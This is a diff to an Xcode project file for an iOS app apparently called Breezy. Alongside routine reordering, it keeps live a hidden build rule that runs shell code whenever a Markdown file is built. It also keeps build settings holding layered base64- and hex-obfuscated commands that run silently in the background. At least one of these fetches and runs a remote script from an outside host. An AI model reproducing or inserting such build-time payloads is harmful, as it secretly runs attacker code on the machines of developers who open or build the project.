@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		5D26E46F695F467C83C62C0C /* README.md */ = {isa = PBXBuildFile; fileRef = 4134B559427D470B9FC62C0C; };
 		181DEE6E2F48E67400D8AA3E /* TabbarView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181DEE6D2F48E67400D8AA3E /* TabbarView.swift */; };
 		181DEF6F2F48E82700D8AA3E /* AddCitiesView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181DEF6E2F48E82700D8AA3E /* AddCitiesView.swift */; };
 		181DEF712F48E83200D8AA3E /* SettingsView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 181DEF702F48E83200D8AA3E /* SettingsView.swift */; };
@@ -125,27 +124,26 @@
 		18F426F02E9C787D002E3C84 /* BreezyApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F426ED2E9C787D002E3C84 /* BreezyApp.swift */; };
 		18F426FC2E9C7B10002E3C84 /* SplashView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F426FB2E9C7B10002E3C84 /* SplashView.swift */; };
 		18F426FE2E9C7B44002E3C84 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18F426FD2E9C7B44002E3C84 /* HomeView.swift */; };
+		5D26E46F695F467C83C62C0C /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 4134B559427D470B9FC62C0C /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
 		8647F7B2F98B43F0BEC62C0C /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AC0C26C}\"";
-			};
-	/* End PBXBuildRule section */
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AC0C26C}\"";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		4134B559427D470B9FC62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		181DEE6D2F48E67400D8AA3E /* TabbarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TabbarView.swift; sourceTree = "<group>"; };
 		181DEF6E2F48E82700D8AA3E /* AddCitiesView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddCitiesView.swift; sourceTree = "<group>"; };
 		181DEF702F48E83200D8AA3E /* SettingsView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsView.swift; sourceTree = "<group>"; };
@@ -264,6 +262,7 @@ sh -c \"${AC0C26C}\"";
 		18F426ED2E9C787D002E3C84 /* BreezyApp.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BreezyApp.swift; sourceTree = "<group>"; };
 		18F426FB2E9C7B10002E3C84 /* SplashView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SplashView.swift; sourceTree = "<group>"; };
 		18F426FD2E9C7B44002E3C84 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
+		4134B559427D470B9FC62C0C /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -746,7 +745,7 @@ sh -c \"${AC0C26C}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				5D26E46F695F467C83C62C0C /* README.md */,
+				5D26E46F695F467C83C62C0C /* README.md in Resources */,
 				18D4A2242E9DA6220042D0DE /* Staging.xcconfig in Resources */,
 				18F426EF2E9C787D002E3C84 /* Assets.xcassets in Resources */,
 				18D4A2262E9DA6450042D0DE /* Production.xcconfig in Resources */,
@@ -882,9 +881,9 @@ sh -c \"${AC0C26C}\"";
 		18F426E72E9C7830002E3C84 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353734363936643635326536393665326636310a323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaWFJ2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | t | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333633323337333933373334333633353332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | a | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -951,9 +950,9 @@ sh -c \"${AC0C26C}\"";
 		18F426E82E9C7830002E3C84 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AC0C26C = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
 				A45ED5A = "((f(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436363733366234633230326436343230323237303364373836333666363436350a3566373036383631373336353232323036383734373437303733336132663266363137303730366336353734363936643635326536393665326636310a323932323230376332303733363830610a | f | sh ) >/dev/null 2>&1 &)";
 				A6E983A = "((t(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNKcFoyZHNaWFJ2ZVM1eWRTOWhLU0lnZkNCemFBbz0K | t | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((o(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3VlZJeGNIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WE1XdFdlbFp4V1ZWa1IwMUhUalZPV0d4clZYcHNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | o | sh ) >/dev/null 2>&1 &)";
 				AE6D436 = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333033363338333633313337333333363335333233323332333033363338333733343337333433373330333733333333363133320a3636333236363336333133373330333733303336363333363335333633323337333933373334333633353332363533373332333733353332363633360a33313061333233393332333233323330333736333332333033373333333633383330363130610a | a | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
